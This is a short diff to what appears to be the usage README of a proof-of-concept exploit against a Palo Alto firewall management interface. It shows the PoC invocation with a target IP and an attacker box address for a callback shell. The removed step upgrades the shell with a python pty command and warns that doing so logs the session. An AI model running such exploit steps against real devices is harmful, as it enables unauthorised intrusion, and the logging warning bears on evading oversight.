@@ -346,13 +346,6 @@ python PoC.py https://<ip_of_palo_management_interface> <ip_address_of_attack_bo
 
    If you do not see the following, its time to troubleshoot.
 
-4. To receive a more usable shell tty, use the following command:
-
-```bash
-python -c 'import pty; pty.spawn("/bin/bash")'
-```
-***NOTE- UPGRADING SHELL WILL GENERATE A LOG AND YOUR SESSION WILL BE DOCUMENTED
-
 Troubleshooting steps:
 
    1. Use the correct IP addresses and ports in your listeners and exploit arguments
